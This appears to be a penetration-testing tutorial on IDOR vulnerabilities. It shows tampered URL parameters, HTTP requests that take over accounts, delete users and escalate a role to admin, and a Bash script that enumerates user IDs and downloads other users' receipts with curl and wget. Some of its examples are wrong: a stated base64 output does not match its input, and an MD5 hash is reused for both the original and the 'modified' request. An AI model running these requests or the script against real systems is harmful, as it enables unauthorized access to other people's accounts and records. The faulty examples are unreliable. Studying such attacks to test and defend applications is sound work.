# 🆔 IDOR (Insecure Direct Object Reference)

## Introduction to IDOR Vulnerabilities

**IDOR (Insecure Direct Object Reference)** vulnerabilities occur when a web application directly exposes a reference to an internal object, such as a document, user profile, or database entry, which can be manipulated by end-users. This type of vulnerability allows unauthorized access to other similar objects by altering the reference.

For instance, consider a link structured like this:

```
retrieve.php?doc_id=456
```

In this case, the URL directly references a document with `doc_id=456`. If an attacker modifies the `doc_id` to access another document:

```
retrieve.php?doc_id=457
```

If the application lacks adequate backend access controls, this manipulation might grant access to unauthorized documents or resources simply by changing the `doc_id`.

#### Identifying IDOR Vulnerabilities

To find IDOR vulnerabilities, one should analyze **URL parameters** or **API endpoints** that reference objects, such as:

```
?user_id=2
?document_name=report_1.pdf
```

These object references are typically located in URLs and API requests, but they may also appear in other HTTP headers, like cookies.

**Encoded or Hashed Object References**

Some applications implement security measures by encoding or hashing object references. Rather than using straightforward numerical identifiers, an application might encode the reference. For instance, a reference like:

```
?document_name=c2FtcGxlX2ZpbGUuYWRk
```

can be decoded from **Base64** to reveal:

```plaintext
sample_file.add
```

To test for IDOR vulnerabilities, an attacker might encode a different filename, such as `document_457.add`, and try accessing it with the new encoded reference:

```plaintext
?document_name=c2FtcGxlXzQ1Nw==
```

**Example of Base64 Encoding in PHP:**

```php
$filename = 'document_457.add';
$encodedFilename = base64_encode($filename);
echo $encodedFilename; // Outputs: c2FtcGxlXzQ1Nw==
```

**Hashed Object References**

Alternatively, object references may be hashed, such as:

```
retrieve.php?document_hash=5f4dcc3b5aa765d61d8327deb882cf99
```

At first glance, this may seem secure. However, if we examine the application’s source code, we may find how the hash is generated before the API call is executed. For example, the hashing function could be applied to the document name combined with a secret key:

```php
$document = 'document_456';
$secretKey = 'mySecret';
$documentHash = md5($document . $secretKey);
```

In this scenario, if an attacker can discover how the hash is created, they could generate valid hashes for documents they don’t have access to and attempt to access them using the modified request:

```plaintext
retrieve.php?document_hash=5f4dcc3b5aa765d61d8327deb882cf99
```

## Insecure APIs

**IDOR (Insecure Direct Object Reference)** vulnerabilities can occur when an application allows insecure function calls to its APIs, enabling an attacker to invoke these functions as if they were another user. This can lead to unauthorized actions such as altering another user's private information, resetting their password, or making purchases using someone else's payment details.

**Example Scenario: Editing a Profile**

Let’s consider a web application that includes an **Edit Profile** function. If we intercept the request while trying to edit a user’s profile, we may see hidden parameters in the request, such as `user_id` and `session_token`.

**Understanding API Request Methods**

In the context of APIs, different HTTP methods serve specific purposes:

* **PUT**: Used to update existing resource details.
* **POST**: Used to create new resources.
* **DELETE**: Used to remove resources.
* **GET**: Used to retrieve details about resources.

### **Exploiting Insecure Function Calls**

Assuming we are able to intercept a request to change a user’s profile, we might modify the request to manipulate another user's details, which could facilitate various web attacks. For example, we might send a `PUT` request to an API endpoint to change a user’s profile like this:

```http
PUT /api/user/update HTTP/1.1
Host: target-api.com
Content-Type: application/json

{
    "user_id": "12345", 
    "email": "new_email@example.com",
    "role": "admin"
}
```

Here, we could change the `user_id` to that of another user (e.g., `67890`) to take over their account.

### **Creating or Deleting Users**

With insufficient access controls, we could also send a `POST` request to create new users with arbitrary details:

```http
POST /api/user/create HTTP/1.1
Host: target-api.com
Content-Type: application/json

{
    "username": "attacker_user",
    "password": "securePassword123",
    "role": "user"
}
```

Similarly, we could issue a `DELETE` request to remove existing users:

```http
DELETE /api/user/delete HTTP/1.1
Host: target-api.com
Content-Type: application/json

{
    "user_id": "67890"
}
```

### **Escalating Privileges**

In this situation, we could also attempt to escalate our privileges by altering our role within the application. For instance, by modifying the `role` parameter in our request, we could assign ourselves an admin role, allowing us greater access to the system.

```http
PUT /api/user/role/update HTTP/1.1
Host: target-api.com
Content-Type: application/json

{
    "user_id": "current_user_id",
    "role": "admin"
}
```

**Testing for IDOR Vulnerabilities**

To effectively test for IDOR vulnerabilities, we should explore and experiment with various parameters that we can manipulate, such as:

* Changing our `user_id` to match another user’s ID.
* Trying different parameters to see if we can access unauthorized data.

```http
GET /api/user/details?user_id=67890 HTTP/1.1
Host: target-api.com
```

If the application does not implement robust access control mechanisms, this request may allow us to retrieve sensitive details about another user.

### Scaling Our IDOR Attacks

#### Overview of Vulnerable Parameters

Consider a scenario where a user has a unique identifier, `user_id=5`. The application might provide access to their personal receipts through a URL like:

```
http://SERVER_IP:PORT/receipts.php?user_id=5
```

Assuming the user's receipts are named following a consistent pattern, we may encounter files such as:

* `/receipts/Receipt_3_12_2023.pdf`

The predictable naming convention of these receipt files enables the potential enumeration of files belonging to other users simply by changing the `user_id`.

#### Analyzing Receipt Listings

Upon inspecting the HTML structure of the receipts page, we might find entries formatted like this:

```html
<li class='receipt-item'><a href='/receipts/Receipt_4_01_2022.pdf' target='_blank'>Receipt</a></li>
```

To identify all receipt links, we can look for the distinctive class name `.receipt-item`.

### Extracting Receipt URLs

Utilizing `curl` combined with `grep`, we can fetch the receipt listings for a specific user:

```bash
curl -s "http://SERVER_IP:PORT/receipts.php?user_id=5" | grep "<li class='receipt-item'>"
```

To streamline the process and extract just the receipt URLs, we can refine our command using a regex pattern:

```bash
curl -s "http://SERVER_IP:PORT/receipts.php?user_id=6" | grep -oP "\/receipts.*?\.pdf"
```

This command will output only the links of the PDF receipts.

#### Automating Receipt Retrieval

To automate the enumeration of receipts for multiple users, we can implement a Bash script that cycles through a predefined range of user IDs. The following script exemplifies this:

```bash
#!/bin/bash

base_url="http://SERVER_IP:PORT"

# Loop through user IDs 1 to 10
for id in {1..10}; do
    # Retrieve and download receipts for the current user
    for receipt in $(curl -s "$base_url/receipts.php?user_id=$id" | grep -oP "\/receipts.*?\.pdf"); do
        # Download each receipt silently
        wget -q "$base_url$receipt"
    done
done
```

***
